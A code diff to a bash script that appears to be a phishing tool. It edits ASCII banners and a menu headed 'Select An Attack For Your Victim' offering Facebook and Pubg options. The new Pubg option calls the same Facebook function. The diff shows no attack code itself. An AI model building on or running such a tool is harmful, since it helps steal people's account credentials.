@@ -50,7 +50,8 @@ Black_Mafia() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE} ██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
+		${ORANGE} 
+                ${ORANGE} ██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
                 ${ORANGE} ██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
                 ${ORANGE} ██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
                 ${ORANGE} ██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
@@ -68,7 +69,8 @@ banner() {
 ## Small Banner
 banner_mafia() {
 	cat <<- EOF
-		${BLUE}╔═╗╔╗╔╗╔══╗╔══╗╔╗╔╗╔══╗╔═╦╗╔══╗
+		${BLUE}
+                ${BLUE}╔═╗╔╗╔╗╔══╗╔══╗╔╗╔╗╔══╗╔═╦╗╔══╗
                 ${BLUE}║╬║║╚╝║╚║║╝║══╣║╚╝║╚║║╝║║║║║╔═╣
                 ${BLUE}║╔╝║╔╗║╔║║╗╠══║║╔╗║╔║║╗║║║║║╚╗║
                 ${BLUE}╚╝─╚╝╚╝╚══╝╚══╝╚╝╚╝╚══╝╚╩═╝╚══╝
@@ -315,7 +317,7 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}Select An Attack For Your Victim
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook
-                ${RED}[${WHITE}11${RED}]${ORANGE} Facebook 1
+                ${RED}[${WHITE}02${RED}]${ORANGE} Pubg
 		${RED}[${WHITE}99${RED}]${ORANGE} About
                 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -326,7 +328,7 @@ main_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		lovehacker_facebook
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		lovehacker_facebook1
+		lovehacker_facebook
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
